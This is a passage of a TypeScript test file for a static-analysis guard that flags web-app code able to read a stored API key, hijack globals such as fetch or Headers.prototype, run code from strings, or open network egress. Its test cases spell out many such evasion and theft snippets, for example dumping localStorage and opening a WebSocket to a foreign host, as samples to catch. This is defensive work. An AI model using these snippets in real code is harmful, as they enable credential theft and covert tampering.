      "globalThis.fetch = (input, init) => spy(input, init);",
      "fetch = spy;",
      'Object.defineProperty(window, "fetch", { value: spy });',
    ]) {
      expect(caught(line), line).not.toEqual([]);
    }
  });

  it("each syntax rule catches its kind (astra A03d F1)", () => {
    const cases: Array<[string, string]> = [
      ["global-alias", "const s = self;"],
      ["global-alias", "Object.assign(window, { fetch: spy });"],
      ["global-alias", "const { localStorage: s } = window;"],
      ["global-alias", "const t = window.top;"],
      ["global-alias", "const d = (globalThis as any).document;"],
      ["window-handle", "const w = document.defaultView;"],
      ["window-handle", "const w = frame.contentWindow;"],
      ["reflect", "const v = Reflect.get(obj, name);"],
      ["spelled-name", 'const n = "session" + "Storage";'],
      ["spelled-name", "const n = `pcc-${\"api\"}-key`;"],
      ["global-write", "navigator.sendBeacon = spy;"],
      ["global-write", "Headers.prototype.set = spy;"],
      ["global-write", 'window["fetch"] = spy;'],
      ["image-egress", "const img = new Image(1, 1);"],
      ["code-from-string", 'const g = Function("return this")();'],
      ["code-from-string", '(() => 0).constructor("return this")();'],
      ["code-from-string", 'setTimeout("steal()", 0);'],
      ["code-from-string", 'const mods = import.meta.glob("../lib/*.ts", { eager: true });'],
    ];
    for (const [rule, line] of cases) expect(caught(line), line).toContain(rule);
  });

  it("astra round 5: a built-in or global replaced through a mutation API, not an assignment", () => {
    for (const line of [
      'Object.defineProperty(Headers.prototype, "set", { value: observe });',
      "Object.assign(Headers.prototype, { set: observe });",
      'Object.defineProperties(Request.prototype, { headers: { get: observe } });',
      'Object.defineProperty(navigator, "sendBeacon", { value: observe });',
      "Object.setPrototypeOf(Headers.prototype, Spy.prototype);",
      'Object.defineProperty(JSON, "stringify", { value: observe });',
      'Headers.prototype.__defineGetter__("get", observe);',
    ]) {
      expect(caught(line), line).toContain("global-write");
    }
  });

  it("the same through an alias of Object, a helper library, or any call handed a built-in's prototype", () => {
    for (const code of [
      'const O = Object;\nO.defineProperty(Headers.prototype, "set", { value: observe });',
      "_.assign(Headers.prototype, { set: observe });",
      "$.extend(Request.prototype, { clone: observe });",
      "merge(Headers.prototype, overrides);",
      "patch(Headers.prototype, observe);",
      "_.assign(navigator, { sendBeacon: observe });",
      'const O = Object;\nO.defineProperty(navigator, "sendBeacon", { value: observe });',
    ]) {
      expect(caught(code), code).toContain("global-write");
    }
  });

  it("astra round 6: the protected target through a local alias", () => {
    for (const code of [
      'const headersPrototype = Headers.prototype;\nObject.defineProperty(headersPrototype, "set", { value: observe });',
      'const nav = navigator;\nObject.defineProperty(nav, "sendBeacon", { value: observe });',
      'const { prototype } = Headers;\nObject.defineProperty(prototype, "set", { value: observe });',
      "const p = Headers.prototype;\nconst q = p;\nq.set = observe;",
      "const p = (Headers as any).prototype;\npatch(p, observe);",
      'const nav = typeof navigator !== "undefined" ? navigator : undefined;\nObject.assign(nav, { sendBeacon: observe });',
      'const { prototype: hp } = Headers;\nObject.defineProperty(hp, "set", { value: observe });',
      // An alias chain out of source order: q is bound to p in a function declared before p.
      'function later() { Object.defineProperty(q, "set", { value: observe }); }\nlet q;\nfunction setup() { q = p; }\nconst p = Headers.prototype;',
    ]) {
      expect(caught(code), code).toContain("global-write");
    }
  });

  it("a protected object handed to a helper, which could change it inside (self-found, A03f F1's family)", () => {
    for (const code of [
      'function patch(t) { Object.defineProperty(t, "sendBeacon", { value: observe }); }\npatch(navigator);',
      "const nav = navigator;\ninstrument(nav);",
      "wrap(Headers);",
    ]) {
      expect(caught(code), code).toContain("global-write");
    }
  });

  it("a protected object held anywhere a name can reach it later (self-found, A03f F1's family)", () => {
    for (const code of [
      'const holder = { proto: Headers.prototype };\nObject.defineProperty(holder.proto, "set", { value: observe });',
      'class Patch { proto = Headers.prototype; run() { Object.defineProperty(this.proto, "set", { value: observe }); } }',
      "function proto() { return Headers.prototype; }",
      "const targets = [navigator, document];",
      'const nav = window.navigator;\nObject.defineProperty(nav, "sendBeacon", { value: observe });',
      'const proto = Object.getPrototypeOf(new Headers());\nObject.defineProperty(proto, "set", { value: observe });',
      'const proto = new Headers().__proto__;',
      'const doc = document;\nconst el = doc.createElement("div");', // harmless here, but an alias all the same: read document directly
      "const env = { navigator };",
    ]) {
      expect(caught(code), code).toContain("global-write");
    }
  });

  it.each([
    'const p = Headers["prototype"];\nObject.defineProperty(p, "set", { value: observe });',
    'const nav = navigator.valueOf();\nObject.defineProperty(nav, "sendBeacon", { value: observe });',
  ])("astra A03g F1: a protected object reached by a literal element read, or a read returning its receiver: %s", (code) => {
    expect(caught(code)).toContain("global-write");
  });

  it.each([
    ["global-write", 'const p = new Headers()["__proto__"];\np.set = observe;'],
    ["global-write", 'const proto = Object["getPrototypeOf"](new Headers());\nproto.set = observe;'],
    ["global-write", "const H = Headers.valueOf();\nH.prototype.set = observe;"],
    ["global-write", 'const sp = Storage["proto" + "type"];\nsp.setItem = observe;'],
    ["global-write", "const a = Array.prototype.reverse();\na.push = observe;"],
    ["window-handle", 'const w = document["defaultView"];'],
    ["code-from-string", '(() => 0)["constructor"]("return this")();'],
    ["global-write", "const d = document.documentElement.parentNode;\nd.title = observe;"],
    ["global-write", "const d = document.getRootNode();\nd.title = observe;"],
    ["global-write", 'const d = node.ownerDocument;\nObject.defineProperty(d, "cookie", { get: observe });'],
  ])("A03g F1's family, self-found (%s): %s", (rule, code) => {
    expect(caught(code)).toContain(rule);
  });

  // Each layer on its own: these are caught by exactly one check, so a control that removes the check fails here.
  it.each([
    ["the read-only rule, by element access", 'const p = Headers["prototype"];'],
    ["a read returning its receiver", "const nav = navigator.valueOf();"],
    ["a method called on a built-in's prototype", "Array.prototype.reverse();"],
    ["a walk to the document", "const d = document.documentElement.parentNode;"],
    ["the mutation-target check, through a member read", "const c = navigator.clipboard;\nc.writeText = observe;"],
    ["the mutation-target check, through a mutation API", 'const l = navigator.locks;\nObject.defineProperty(l, "request", { value: observe });'],
    ["the mutation-target check, through an alias chain", "const c = navigator.clipboard;\nconst d = c;\ndelete d.writeText;"],
  ])("A03g F1, one layer at a time (%s): %s", (_layer, code) => {
    expect(caught(code)).toContain("global-write");
  });

  it.each([
    "const name = ordinary.constructor.name;",
    "if (value.constructor === Rows) merge(value);",
    'const isPlain = typeof value.constructor === "function";',
  ])("astra A03g F2: reading a constructor's name, or comparing it, is let through: %s", (code) => {
    expect(caught(code)).toEqual([]);
  });

  it("the syntax rules let through what the app does", () => {
    for (const [code, rel] of [
      ['window.location.href = "/";', "pages/Probe.ts"],
      ['if (typeof window !== "undefined") window.addEventListener("storage", onChange);', "pages/Probe.ts"],
      ["const w = window.innerWidth;", "pages/Probe.ts"],
      ["type W = typeof window;", "pages/Probe.ts"],
      ['const tip = "A challenge window opens; self-attested at tier 0.";', "pages/Probe.ts"],
      ["const el = <p>The challenge window opens, then funds release.</p>;", "pages/Probe.tsx"],
      ["const frame = trace.frames[0];", "pages/Probe.ts"],
      ["setTimeout(() => setOpen(false), 300);", "pages/Probe.ts"],
      ["const merged = Object.assign({}, defaults, overrides);", "pages/Probe.ts"],
      ['Object.defineProperty(instance, "label", { value: "x" });', "pages/Probe.ts"],
      ['window.location.assign("/agents");', "pages/Probe.ts"],
      ["const next = merge(state, update);", "pages/Probe.ts"],
      ["const items = Array.prototype.slice.call(list);", "pages/Probe.ts"],
      ["let state = initial;\nstate = Object.assign({}, state, update);", "pages/Probe.ts"],
      ["const w = window.innerWidth;\nconst width = Math.max(w, 1);", "pages/Probe.ts"],
      ["const ua = (navigator as Navigator).userAgent;", "pages/Probe.ts"],
      ["if (body instanceof Blob) send(body);", "pages/Probe.ts"],
      ["const url = new URL(path, window.location.origin);", "pages/Probe.ts"],
      ["class Rows extends Array<string> {}", "pages/Probe.ts"],
      ["const h: Headers = new Headers({ accept: 'application/json' });", "pages/Probe.ts"],
      ['const hasLocks = "locks" in navigator;', "pages/Probe.ts"],
      ["const items = Array.from(list).filter(Boolean);", "pages/Probe.ts"],
    ]) {
      expect(caught(code, rel), code).toEqual([]);
    }
  });

  it("other ways to reach the slot, a reader, or the network", () => {
    for (const line of [
      "const k = localStorage.getItem(name);",
      "const k = localStorage.getItem(`pcc-${'api'}-key`);",
      "for (let i = 0; i < localStorage.length; i++) localStorage.key(i);",
      "const all = Object.entries(localStorage);",
      "send(JSON.stringify(localStorage));",
      "const copy = { ...localStorage };",
      "const v = localStorage[slot];",
      "const ls = localStorage;",
      'sessionStorage.setItem(slot, "x");',
      'const s = window["local" + "Storage"];',
      'const s = globalThis["localStorage"];',
      "const s = self?.[name];",
      "const s = Reflect.get(window, name);",
      "const g = Storage.prototype.getItem;",
      'const mod = await import("../stores/" + "auth-store.js");',
      'const mod = await import("../lib/authorized-fetch.js");',
      'import * as keys from "../lib/authorized-fetch.js";',
      'export * from "../stores/auth-store.js";',
      "eval(source);",
      'const f = new Function("return 1");',
      "const x = new XMLHttpRequest();",
      'const ws = new WebSocket("wss://foreign.example");',
      "headers: { Authorization: `Bearer ${key}` },",
      'headers: { "authorization": token },',
      'h.set("Authorization", v);',
      'const auth = "Bearer " + key;',
      "const auth = `Bearer ${key}`;",
    ]) {
      expect(caught(line), line).not.toEqual([]);
    }
  });

  it("lets through what the app does today", () => {
    for (const line of [
      'const seen = localStorage.getItem("pcc-tour-seen");',
      'localStorage.setItem("pcc-tour-seen", "true");',
      'localStorage.removeItem("pcc-tour-seen");',
      'const label = "Authorized";',
      'import("./pages/DashboardPage.js").then((m) => ({ default: m.DashboardPage }))',
      'import { authorizedFetch } from "../lib/authorized-fetch.js";',
      'const es = new EventSource("/api/traces/stream");',
      "const frame = trace.frames[currentFrame];",
      "const w = layout.window[0];",
    ]) {
      expect(caught(line), line).toEqual([]);
    }
  });
});
